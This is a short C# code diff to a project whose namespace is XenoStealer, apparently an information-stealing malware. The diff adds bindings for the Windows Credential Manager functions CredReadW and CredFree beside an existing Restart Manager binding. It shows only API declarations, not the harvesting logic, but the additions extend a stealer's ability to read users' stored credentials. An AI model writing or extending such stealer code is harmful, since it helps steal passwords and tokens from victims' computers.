@@ -216,6 +216,11 @@ namespace XenoStealer
         [DllImport("rstrtmgr.dll", SetLastError = true)]
         public static extern uint RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps, out InternalStructs.RM_REBOOT_REASON lpdwRebootReasons);
 
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CredReadW(string target, CRED_TYPE type, int reservedFlag, out IntPtr credentialPtr);
+
+        [DllImport("advapi32.dll")]
+        public static extern void CredFree(IntPtr credentialPtr);
 
     }
 }
